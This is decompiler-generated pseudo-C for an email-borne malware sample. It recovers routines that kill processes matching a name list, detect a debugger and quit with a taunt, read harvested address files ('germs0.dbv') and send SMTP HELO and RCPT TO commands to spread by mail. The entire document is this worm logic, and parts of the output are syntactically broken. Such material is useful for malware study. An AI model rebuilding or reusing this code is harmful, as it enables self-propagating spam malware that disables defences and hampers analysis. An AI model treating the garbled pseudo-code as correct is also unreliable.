/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_2492/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x00401000 - 0x004010E2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401000()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252272;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 276;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    edi = 0;
    *(ebp - 4) = 0;
    *(ebp + -292) = 0;
    esi = *(ebp + 8);
    eax = L0040A210(esi);
    if(eax != 0) {
        if(*(ebp + 12) != edi) {
            *(ebp + -292) = L0040A1E0(esi, 92);
        }
        *(ebp + -292) = *(ebp + -292) == edi ? esi : *(ebp + -292) + 1;
        (save)L0040A0F0(ebp + -284, *(ebp + -292));
        *__imp__CharLowerA();
        for(*(ebp + -288) = edi; 1; *(ebp + -288) = *(ebp + -288) + 1) {
            if(*(ebp + -288) >= 109) {
                goto L004010ce;
            }
            if(L0040A070(ebp + -284, *( *(ebp + -288) * 4 + 0x410030)) != 0) {
                break;
            }
        }
        eax = 1;
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L004010d4;
    return(1);
    esp = *(ebp - 24);
L004010ce:
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L004010d4:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x004010E3 - 0x004011FE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010E3()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252288;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    (save)ecx;
    eax = 5200;
    L0040A560();
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    edi = *(ebp + 12);
    *edi = 0;
    (save)ebp + -5204;
    (save)5120;
    (save)0;
    (save) *(ebp + 8);
    eax = GetFileVersionInfoA();
    if(eax != 0) {
        (save)ebp - 80;
        (save)ebp - 84;
        (save)"\VarFileInfo\Translation";
        (save)ebp + -5204;
        eax = VerQueryValueA();
        if(eax != 0 && *(ebp - 80) != ebx) {
            eax = *(ebp - 84);
            esi = __imp__wsprintfA;
            eax = *__imp__wsprintfA(ebp + -5224, "%04X%04X", *eax & 65535, *eax >> 16);
            if(eax == 8) {
                *esi(ebp - 76, "\StringFileInfo\%s\OriginalFilename", ebp + -5224);
                (save)ebp - 80;
                (save)ebp - 84;
                (save)ebp - 76;
                (save)ebp + -5204;
                eax = VerQueryValueA();
                if(eax != 0 && *(ebp - 80) > ebx && *(ebp - 80) <= 39) {
                    L0040A460(edi, *(ebp - 84), *(ebp - 80));
                    eax = *(ebp - 80);
                    *(eax + edi) = bl;
                    goto L004011ec;
                    return(1);
                    esp = *(ebp - 24);
                    eax = *(ebp + 12);
                    *eax = 0;
                }
            }
        }
    }
L004011ec:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x004011FF - 0x00401293
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004011FF()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252304;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 16;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    edi = *(ebp + 8);
    (save)edi;
    if(*__imp__GetParent() == 0) {
        (save)ebp - 28;
        (save)edi;
        *__imp__GetWindowThreadProcessId();
        for(eax = 0; 1; eax = eax + 1) {
            *(ebp - 32) = eax;
            if(eax >= *L00412DD0) {
                goto L0040127c;
            }
            if(*(ebp - 28) == *(eax * 4 + 0x412d08)) {
                break;
            }
        }
        *__imp__PostMessageA();
        *__imp__PostMessageA(edi, 16, ebx, ebx, edi, 2, ebx, ebx);
        goto L0040127c;
        return(1);
        esp = *(ebp - 24);
    }
L0040127c:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return(1);
}

stack space not deallocated on return
/*	Procedure: 0x00401294 - 0x0040133A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401294()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252320;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 20;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    (save)0;
    (save)0x4011ff;
    eax = *__imp__EnumWindows();
    for(edi = 0; 1; edi = edi + 1) {
        *(ebp - 36) = edi;
        if(edi >= *L00412DD0) {
            goto L00401328;
        }
        eax = *(edi * 4 + 0x412d08);
        if(eax != ebx) {
            (save)eax;
            (save)ebx;
            (save)1048577;
            eax = *__imp__OpenProcess();
            esi = eax;
            *(ebp - 28) = esi;
            if(esi != ebx) {
                (save)200;
                (save)esi;
                eax = *__imp__WaitForSingleObject();
                *(ebp - 32) = eax;
                if(*(ebp - 32) == 258) {
                    (save)ebx;
                    (save)esi;
                    *__imp__TerminateProcess();
                }
                eax = *__imp__CloseHandle(esi);
            }
        }
    }
    return(1);
    esp = *(ebp - 24);
L00401328:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040133B - 0x0040166B
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L0040133B()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252336;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 1028;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    L0040A590(0x412d08, 0, 200);
    *L00412DD0 = ebx;
    if(*L0041A66C == ebx) {
        *(ebp + -712) = ebx;
        ecx = 99;
        eax = 0;
        edi = ebp + -708;
        asm("rep stosd");
        (save)"psapi.dll";
        eax = *__imp__LoadLibraryA();
        edi = eax;
        *(ebp - 40) = edi;
        if(edi != ebx) {
            (save)"EnumProcesses";
            (save)edi;
            esi = __imp__GetProcAddress;
            *(ebp + -724) = *__imp__GetProcAddress();
            (save)"EnumProcessModules";
            (save)edi;
            *(ebp + -308) = *esi();
            (save)"GetModuleFileNameExA";
            (save)edi;
            eax = *esi();
            *(ebp + -720) = eax;
            if(*(ebp + -724) != ebx && *(ebp + -308) != ebx && eax != ebx) {
                (save)ebp - 28;
                (save)400;
                (save)ebp + -712;
                if(*(ebp + -724)() != 0) {
                    for(*(ebp - 32) = ebx; 1; edi = *(ebp - 40)) {
                        ecx = *(ebp - 28) >> 2;
                        eax = *(ebp - 32);
                        if(eax >= ecx) {
                            break;
                        }
                        edi = ebp + eax * 4 + -712;
                        (save) *edi;
                        (save)ebx;
                        (save)1040;
                        ebx = *__imp__OpenProcess();
                        *(ebp + -312) = ebx;
                        if(ebx != 0) {
                            (save)ebp - 28;
                            (save)4;
                            (save)ebp + -716;
                            (save)ebx;
                            if(*(ebp + -308)() != 0) {
                                (save)261;
                                (save)ebp + -304;
                                (save) *(ebp + -716);
                                (save)ebx;
                                eax = *(ebp + -720)();
                                *(ebp - 28) = eax;
                                if(eax != 0) {
                                    *(ebp + eax + -304) = 0;
                                    if(L00401000(ebp + -304, 1) != 0) {
                                        eax = *edi;
                                        *( *L00412DD0 * 4 + 0x412d08) = eax;
                                        *L00412DD0 = *L00412DD0 + 1;
                                    }
                                }
                            }
                            (save)ebx;
                            *__imp__CloseHandle();
                        }
                        *(ebp - 32) = *(ebp - 32) + 1;
                        ebx = 0;
                    }
                }
                (save)edi;
                *__imp__FreeLibrary();
                goto L004015ef;
            }
            eax = *__imp__FreeLibrary(edi);
        }
    } else {
        *(ebp + -1040) = ebx;
        *(ebp + -1028) = ebx;
        (save)73;
        eax = 0;
        edi = ebp + -1024;
        asm("rep stosd");
        (save)"kernel32.dll";
        eax = *__imp__GetModuleHandleA();
        edi = eax;
        *(ebp + -1036) = edi;
        if(edi != ebx) {
            (save)"CreateToolhelp32Snapshot";
            (save)edi;
            esi = __imp__GetProcAddress;
            *(ebp + -1032) = *__imp__GetProcAddress();
            (save)"Process32First";
            (save)edi;
            *(ebp + -732) = *esi();
            (save)"Process32Next";
            (save)edi;
            eax = *esi();
            *(ebp + -728) = eax;
            if(*(ebp + -1032) != ebx && *(ebp + -732) != ebx && eax != ebx) {
                (save)ebx;
                (save)2;
                eax = *(ebp + -1032)();
                edi = eax;
                *(ebp + -1040) = edi;
                if(edi != -1) {
                    *(ebp + -1028) = 296;
                    (save)ebp + -1028;
                    (save)edi;
                    for(eax = *(ebp + -732)(); eax != 0; eax = *(ebp + -728)()) {
                        if(L00401000(ebp + -992, 1) != 0) {
                            eax = *(ebp + -1020);
                            *( *L00412DD0 * 4 + 0x412d08) = eax;
                            *L00412DD0 = *L00412DD0 + 1;
                        }
                        (save)ebp + -1028;
                        (save)edi;
                    }
                    (save)edi;
                    *__imp__CloseHandle();
L004015ef:
                    if(*L00412DD0 > ebx) {
                        L00401294();
                    }
                    (save)"kernel32.dll";
                    eax = *__imp__GetModuleHandleA();
                    *(ebp - 36) = eax;
                    if(eax != ebx) {
                        (save)"IsDebuggerPresent";
                        (save)eax;
                        eax = *esi();
                        *(ebp + -1044) = eax;
                        if(eax != ebx) {
                            eax = *eax();
                            if(eax != 0) {
                                *__imp__MessageBoxA();
                                *__imp__PostMessageA();
                                eax = *__imp__ExitProcess(ebx, 65535, 18, ebx, ebx, ebx, "Try to pull my legs?", " ", ebx);
                                goto L00401657;
                                return(1);
                                esp = *(ebp - 24);
                            }
                        }
                    }
                }
            }
        }
    }
L00401657:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040166C - 0x0040182F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040166C()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252352;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    (save)ecx;
    eax = 30024;
    L0040A560();
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = ecx;
    edi = 0;
    *(ebp + -30044) = 0;
    *(ebp - 4) = 0;
    if(*esi == 0) {
L004016ac:
        eax = 0;
L004016ae:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        eax = L0040A210(esi + 4);
        *(ebp - 32) = ecx;
        if(!(ecx = 29999 - eax)) {
            (save)edi;
            (save)ecx;
            (save)ebp + -30040;
            (save) *esi;
            eax = L0040A010();
            *(ebp - 36) = eax;
            if(eax == -1 || eax == edi) {
                goto L004016ac;
            }
            *(ebp + eax + -30040) = 0;
            ebx = esi + 30160;
            (save)ebx;
            edi = __imp__EnterCriticalSection;
            *__imp__EnterCriticalSection();
            L0040A630(esi + 4, ebp + -30040, *(ebp - 36));
            (save)ebx;
            *__imp__LeaveCriticalSection();
            if(L0040A210(esi + 4) + 1 >= 30000) {
                (save) *L00412DD4;
                *__imp__SetEvent();
                (save)0;
                *__imp__Sleep();
            } else {
                (save)ebx;
                *edi();
                if(*(esi + 30004) > 0) {
                    eax = esi + 4;
                    *(ebp - 40) = eax;
                    do {
                        eax = L0040A070(eax, "\r\n");
                        *(ebp - 28) = eax;
                        if(eax == 0) {
                            break;
                        }
                        *(ebp + -30044) = *(ebp + -30044) + 1;
                        eax = eax + 2;
                        *(ebp - 40) = eax;
                    } while(*(esi + 30004) != 1);
                    if(*(ebp + -30044) == *(esi + 30004)) {
                        (save) *L00412DD4;
                        *__imp__SetEvent();
                    }
                    (save)0;
                    *__imp__Sleep();
                } else {
                    edi = esi + 4;
                    if(L0040A210(edi) > 4) {
                        (save)edi;
                        eax = L0040A210() + esi - 1;
                        *(ebp - 40) = eax;
                        (save)5;
                        (save)"\r\n.\r\n";
                        (save) *(ebp - 40);
                        esp = esp + 16;
                        if(L0040A5F0() == 0) {
                            (save) *L00412DD4;
                            *__imp__SetEvent();
                        }
                    }
                }
                (save)esi + 30160;
                *__imp__LeaveCriticalSection();
            }
            eax = *(ebp - 36);
            goto L004016ae;
        }
        *__imp__SetEvent();
        *__imp__Sleep(edi, *L00412DD4);
        goto L004016ac;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401830 - 0x004018BF
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401830()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252368;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 12;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = ecx;
    *(ebp - 4) = 0;
    eax = 29999;
    if(*(ebp + 12) > 29999) {
        *(ebp + 12) = 29999;
    }
    edi = esi + 30160;
    (save)edi;
    *__imp__EnterCriticalSection();
    esi = esi + 4;
    ebx = *(ebp + 8);
    L0040A460(ebx, esi, *(ebp + 12));
    *(ebx + *(ebp + 12)) = 0;
    *esi = 0;
    *__imp__LeaveCriticalSection(edi);
    goto L004018a9;
    return(1);
    esp = *(ebp - 24);
    ebx = *(ebp + 8);
    *ebx = 0;
L004018a9:
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = ebx;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/* DEST BLOCK NOT FOUND: 004018ce -> 004018d2 */
/*	Procedure: 0x004018C0 - 0x004018D2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004018C0()
{



    if(L0040A016(2, 1, 6) == -1) {
        eax = 0;
    }
}

stack space not deallocated on return
/*	Procedure: 0x004018D3 - 0x00401945
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004018D3()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252384;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 12;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = ecx;
    ebx = 0;
    *(ebp - 4) = 0;
    eax = *esi;
    if(eax != 0) {
        (save)eax;
        L0040A01C();
        *esi = ebx;
        *(esi + 30008) = bl;
        *(esi + 30158) = bx;
        *(esi + 4) = bl;
        eax = *__imp__SetEvent( *L00412DD4);
        goto L00401933;
        return(1);
        esp = *(ebp - 24);
    }
L00401933:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401946 - 0x00401A9D
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401946()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252400;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 44;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = ecx;
    ebx = ebx | -1;
    *(ebp - 28) = ebx;
    edi = 0;
    *(ebp - 4) = 0;
    (save) *L00412DD4;
    *__imp__ResetEvent();
    if(*esi != edi) {
        if(L0040D680(esi + 30008, *(ebp + 8)) != 0 || *(esi + 30158) != *(ebp + 12)) {
            goto L004019b5;
        }
        eax = ebx;
L004019ad:
        *(ebp - 4) = ebx;
    } else {
L004019b5:
        ecx = esi;
        L004018D3();
        ecx = esi;
        eax = L004018C0();
        *esi = eax;
        if(*esi <= edi) {
            *esi = edi;
        } else {
            (save) *(ebp + 8);
            eax = L0040A03A();
            *(ebp - 28) = eax;
            if(*(ebp - 28) == ebx) {
                (save) *(ebp + 8);
                eax = L0040A034();
                *(ebp - 56) = eax;
                if(eax == edi) {
                    goto L00401a4e;
                }
                L0040A760();
                L0040A760(ebp - 28, *(ebp - 36), 4, ebp - 36, *(eax + 12), 4);
            }
            *(ebp - 52) = 2;
            (save) *(ebp + 12);
            L0040A02E();
            *(ebp - 50) = ax;
            *(ebp - 48) = *(ebp - 28);
            (save)16;
            (save)ebp - 52;
            (save) *esi;
            eax = L0040A028();
            *(ebp - 32) = eax;
            if(*(ebp - 32) != ebx) {
                (save)33;
                (save)1044;
                (save) *(ebp + 16);
                (save) *esi;
                if(L0040A022() != ebx) {
                    goto L00401a5c;
                }
            }
L00401a4e:
            ecx = esi;
            L004018D3();
        }
        eax = 0;
        goto L004019ad;
L00401a5c:
        L0040A0F0(esi + 30008, *(ebp + 8));
        *(esi + 30158) = *(ebp + 12);
        eax = 1;
        goto L004019ad;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401A9E - 0x00401B0C
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401A9E()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252416;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 16;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = ecx;
    eax = 0;
    *(ebp - 4) = 0;
    if(*esi == 0) {
L00401acf:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        eax = L0040A040( *esi, *(ebp + 8), L0040A210( *(ebp + 8)), eax);
        *(ebp - 28) = eax;
        goto L00401acf;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00401B0D - 0x00401B14
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B0D()
{



    return(0 & 255);
}

/*	Procedure: 0x00401B15 - 0x00401B21
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B15(A4)
/* unknown */ void  A4;
{



    *(ecx + 30004) = A4;
    return(*(ecx + 30004));
}

stack space not deallocated on return
/*	Procedure: 0x00401B22 - 0x00401BE6
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B22()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252432;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 20;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = ecx;
    *(ebp - 4) = 0;
    ebx = *(ebp + 8);
    if(L0040A210(ebx) <= 64 && *ebx != 0) {
        if(*(ebp + 12) != 0) {
            (save)ebx;
            *__imp__CharLowerA();
        }
        for(edi = *esi; 1; edi = *(edi + 68)) {
            *(ebp - 28) = edi;
            if(edi == 0) {
                goto L00401b90;
            }
            eax = L0040AAB0(edi, ebx);
            if(eax == 0) {
                break;
            }
        }
L00401b85:
        *(ebp - 4) = *(ebp - 4) | -1;
        goto L00401bd6;
L00401b90:
        eax = L0040AA95(72);
        *(ebp - 32) = eax;
        *(ebp - 28) = eax;
        if(*(esi + 8) == 0) {
            *esi = eax;
        } else {
            *( *(esi + 4) + 68) = eax;
        }
        *(esi + 4) = eax;
        L0040A0F0(eax, ebx);
        *( *(esi + 4) + 68) = 0;
        *(esi + 8) = *(esi + 8) + 1;
        eax = 1;
        goto L00401b85;
        return(1);
        esp = *(ebp - 24);
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L00401bd6:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401BE7 - 0x00401C59
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401BE7()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252448;
    (save)0x40a384;
    eax = *%fs:0x0];
    (save)eax;
    *%fs:0x0] = esp;
    esp = esp - 24;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = ecx;
    ebx = 0;
    *(ebp - 4) = 0;
    if(*(esi + 8) != 0) {
        for(eax = *esi; 1; eax = edi) {
            *(ebp - 32) = eax;
            if(eax == ebx) {
                break;
            }
            edi = *(eax + 68);
            *(ebp - 28) = edi;
            *(ebp - 36) = eax;
            L0040AB34(eax);
        }
        *(esi + 8) = ebx;
        *esi = ebx;
        *(esi + 4) = ebx;
        goto L00401c47;
        return(1);
        esp = *(ebp - 24);
    }
L00401c47:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401C5A - 0x00401D89
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401C5A()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252464;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 48;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    edi = ecx;
    ebx = 0;
    *(ebp - 44) = 0;
    *(ebp - 4) = 0;
    eax = *(edi + 8);
    if(eax != 0) {
        66 = eax * eax;
        eax = L0040AA95(eax);
        *(ebp - 56) = eax;
        *(ebp - 32) = eax;
        if(eax == ebx) {
            eax = 0;
L00401cab:
            *(ebp - 4) = *(ebp - 4) | -1;
            goto L00401d79;
        }
        *eax = bl;
        for(esi = *edi; 1; esi = *(ebp - 28)) {
            *(ebp - 48) = esi;
            if(esi == ebx) {
                break;
            }
            eax = L0040A210(esi);
            eax = *(ebp - 44) + eax + 1;
            *(ebp - 44) = eax;
            ecx = *(edi + 8);
            66 = ecx * ecx;
            if(eax >= ecx) {
                break;
            }
            *(ebp - 28) = *(esi + 68);
            L0040A100();
            L0040A100( *(ebp - 32), esi, *(ebp - 32), ":");
        }
        *(ebp - 44) = L0040A210( *(ebp - 32));
        (save)ebx;
        (save)128;
        (save)4;
        (save)ebx;
        (save)3;
        (save)1073741824;
        (save) *(ebp + 8);
        esi = *__imp__CreateFileA();
        *(ebp - 52) = esi;
        if(esi != -1) {
            *(ebp - 36) = ebx;
            (save)2;
            (save)ebp - 36;
            (save)ebx;
            (save)esi;
            *__imp__SetFilePointer();
            (save)ebx;
            (save)ebp - 40;
            (save) *(ebp - 44);
            (save) *(ebp - 32);
            (save)esi;
            *__imp__WriteFile();
            (save)esi;
            *__imp__CloseHandle();
        }
        eax = *(ebp - 32);
        *(ebp - 60) = eax;
        L0040AB34( *(ebp - 60));
        eax = 1;
        goto L00401cab;
        return(1);
        esp = *(ebp - 24);
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L00401d79:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00401D8A - 0x00401D8D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401D8A()
{



    return(*(ecx + 8));
}

stack space not deallocated on return
/*	Procedure: 0x00401D8E - 0x00402373
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401D8E()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252480;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 100;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    eax = *(ebp + 8);
    *eax = 0;
    if(*(ecx + 8) == 0) {
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        eax = *ecx;
        *(ebp - 112) = eax;
        for(edi = __imp__wsprintfA; 1; *(ebp - 112) = eax) {
            if(eax == ebx) {
                goto L00401e15;
            }
            esi = *(eax + 68);
            *(ebp - 28) = esi;
            (save)eax;
            if(*(ebp + 12) == ebx) {
                (save)"HEAD %s\r\n";
            } else {
                (save)"RCPT TO: <%s>\r\n";
            }
            (save)ebp - 108;
            *edi();
            esp = esp + 12;
            L0040A100( *(ebp + 8), ebp - 108);
            eax = esi;
        }
        return(1);
        esp = *(ebp - 24);
L00401e15:
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = *(ebp + 8);
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252496;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 476;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 36) = 1;
    *(ebp - 4) = 0;
    ebx = 0x412f00;
    L0040A0F0(ebp + -244, 0x412f00);
    (save)0;
    (save)0;
    (save)3;
    (save)0;
    (save)3;
    edi = -1073741824;
    (save)-1073741824;
    (save)L0040A100(ebp + -244, "\germs0.dbv");
    esi = __imp__CreateFileA;
    eax = *__imp__CreateFileA();
    *(ebp - 44) = eax;
    if(*(ebp - 44) == -1) {
        L0040A0F0(ebp + -244, ebx);
        ebx = 0;
        (save)0;
        (save)0;
        (save)3;
        (save)0;
        (save)3;
        (save)edi;
        (save)L0040A100(ebp + -244, "\germs1.dbv");
        *(ebp - 44) = *esi();
        *(ebp - 36) = ebx;
    } else {
        ebx = 0;
    }
    if(*(ebp - 44) == -1) {
        L00405108();
        (save)ebx;
        (save)ebx;
    } else {
        *(ebp + -460) = ebx;
        esi = L00406850(30) + 50;
        *(ebp + -248) = esi;
        (save)ebp - 40;
        (save) *(ebp - 44);
        ebx = *__imp__GetFileSize();
        *(ebp - 28) = ebx;
        edi = L0040AA95(ebx + 2);
        *(ebp + -468) = edi;
        *(ebp - 32) = edi;
        (save)0;
        (save)ebp - 40;
        (save)ebx;
        (save)edi;
        (save) *(ebp - 44);
        *__imp__ReadFile();
        *(edi + *(ebp - 40)) = 0;
        ebx = 4302872;
        ecx = 4302872;
        L00401BE7();
L00401f56:
        if(*(ebp + -460) < esi) {
            eax = L0040A1E0(edi, 58);
            *(ebp + -456) = eax;
            if(eax != 0) {
                ecx = ebx;
                if(L00401B22(eax + 1, 1) != 0) {
                    *(ebp + -460) = *(ebp + -460) + 1;
                }
                *( *(ebp + -456)) = 0;
                goto L00401f56;
            }
            if(*(ebp + -460) >= esi) {
                goto L00401fc1;
            }
            (save) *(ebp - 44);
            *__imp__CloseHandle();
            (save)ebp + -244;
            *__imp__DeleteFileA();
            eax = 0;
            if(*(ebp + -460) != 0) {
                goto L00401ff4;
            }
            (save)0;
            (save)0;
        } else {
L00401fc1:
            *(ebp + -464) = 0;
            (save)0;
            (save)ebp + -464;
            (save)L0040A210(edi);
            (save) *(ebp - 44);
            *__imp__SetFilePointer();
            (save) *(ebp - 44);
            *__imp__SetEndOfFile();
            (save) *(ebp - 44);
            *__imp__CloseHandle();
L00401ff4:
            *(ebp + -472) = edi;
            L0040AB34(edi);
            *(ebp - 32) = 0;
            esi = 0x412f48;
            ecx = 0x412f48;
            L00401B15(1);
            ecx = esi;
            L004018D3();
            ebx = 4302452;
            ecx = esi;
            if(L00401946(4302452, 25, *L0041A6DC) == 0) {
                ecx = esi;
                if(L00401946(ebx, 25, *L0041A6DC) != 0) {
                    goto L00402051;
                }
L00402047:
                (save) *(ebp - 36);
                (save)1;
            } else {
L00402051:
                (save)10000;
                (save) *L00412DD4;
                ebx = __imp__WaitForSingleObject;
                edi = 258;
                if(*__imp__WaitForSingleObject() == 258) {
                    goto L00402047;
                }
                ecx = esi;
                if(L0040AAB0(L00401830(ebp + -348, 3), "220") != 0) {
                    goto L00402047;
                }
                (save)5;
                (save)L00406850() + 3;
                (save)ebp + -452;
                L004068F4();
                (save)ebp + -452;
                (save)"HELO %s\r\n";
                (save)ebp + -348;
                *__imp__wsprintfA();
                esp = esp + 24;
                ecx = esi;
                L00401A9E(ebp + -348);
                ecx = esi;
                if(L00401B0D() == 0) {
                    goto L00402047;
                }
                (save)7000;
                (save) *L00412DD4;
                if(*ebx() == edi) {
                    goto L00402047;
                }
                ecx = esi;
                if(L0040AAB0(L00401830(ebp + -348, 3), "250") != 0) {
                    goto L00402047;
                }
